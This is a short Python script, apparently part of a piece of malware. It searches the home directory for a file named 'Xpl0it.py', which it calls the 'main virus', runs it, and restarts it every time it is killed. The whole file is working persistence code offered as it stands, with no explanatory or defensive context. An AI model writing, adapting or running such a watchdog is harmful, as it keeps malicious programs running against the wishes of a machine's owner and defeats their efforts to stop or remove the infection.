import os
import sys
import subprocess
import time

def find_main_virus():
    target_name =  "Xpl0it.py"

    home_dir = os.path.expanduser("~")
    for root, dirs, files in os.walk(home_dir):
        if target_name in files:
            return os.path.join(root, target_name)
    return None

def is_process_running(pid):
    """Check if the process with the given PID is still running."""
    try:
        os.kill(pid, 0)  # Send a null signal to check if the process exists
    except OSError:
        return False  # If it fails, the process isn't running
    return True

def start_main_virus(main_virus_path):
    process = subprocess.Popen(["python3", main_virus_path])
    return process

def monitor_and_restart():
    main_virus_path = find_main_virus()

    if not main_virus_path:
        print("script not found, exiting...")
        return
    
    print(f"script found: {main_virus_path}")
    process = start_main_virus(main_virus_path)

    while True:
        if not is_process_running(process.pid):
            print("kill command detected, restarting...")
            process = start_main_virus(main_virus_path)
        time.sleep(5)

if __name__ == "__main__":
    monitor_and_restart()
